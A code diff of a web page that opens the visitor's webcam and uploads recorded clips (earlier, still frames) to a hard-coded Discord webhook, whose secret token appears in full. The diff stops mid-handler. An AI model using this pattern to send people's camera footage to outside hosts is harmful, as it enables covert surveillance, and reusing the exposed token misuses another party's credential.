@@ -23,60 +23,70 @@
 <body>
 
 <video id="video" autoplay muted></video>
-<button id="startButton">Start Sending Footage</button>
+<button id="startButton">Start Sending Video</button>
 
 <script>
     const video = document.getElementById('video');
     const startButton = document.getElementById('startButton');
     let stream;
+    let mediaRecorder;
+    let recordedChunks = [];
 
     // Function to start video stream
     async function startVideoStream() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            sendVideoToWebhook();
+            startRecording();
         } catch (error) {
             console.error('Error accessing camera:', error);
         }
     }
 
-    // Function to capture image and send to Discord webhook
-    function sendVideoToWebhook() {
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
+    // Function to start recording the video
+    function startRecording() {
+        recordedChunks = []; // Reset recorded chunks
+        mediaRecorder = new MediaRecorder(stream);
 
-        // Set canvas dimensions
-        canvas.width = 640; // Adjust according to your video settings
-        canvas.height = 480;
+        mediaRecorder.ondataavailable = event => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
 
-        setInterval(() => {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height); // Capture frame
-            canvas.toBlob(blob => {
-                if (blob) {
-                    const formData = new FormData();
-                    formData.append('file', blob, 'video_frame.png'); // Add the captured frame to form data
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            sendVideoToWebhook(blob);
+        };
 
-                    // Sending to Discord webhook
-                    fetch('https://discord.com/api/webhooks/1285242619923927090/8j8Q0hovmnNRuaP8vMfbwBkg7Rr9ntKSy1GouTs1AdOlqhftk8FgwJ_-D-Pq2CwQtYzz', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Frame sent successfully');
-                        } else {
-                            console.error('Error sending frame:', response.statusText);
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Fetch error:', error);
-                    });
-                } else {
-                    console.error('Blob is null, frame capture failed');
-                }
-            }, 'image/png');
-        }, 10000); // Send every 10 seconds
+        mediaRecorder.start();
+
+        // Stop recording after 10 seconds
+        setTimeout(() => {
+            mediaRecorder.stop();
+        }, 10000); // 10 seconds
+    }
+
+    // Function to send video to Discord webhook
+    function sendVideoToWebhook(blob) {
+        const formData = new FormData();
+        formData.append('file', blob, 'video_clip.webm'); // Add the recorded video to form data
+
+        // Sending to Discord webhook
+        fetch('https://discord.com/api/webhooks/1285242619923927090/8j8Q0hovmnNRuaP8vMfbwBkg7Rr9ntKSy1GouTs1AdOlqhftk8FgwJ_-D-Pq2CwQtYzz', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Video sent successfully');
+            } else {
+                console.error('Error sending video:', response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Fetch error:', error);
+        });
     }
 
     startButton.addEventListener('click', () => {
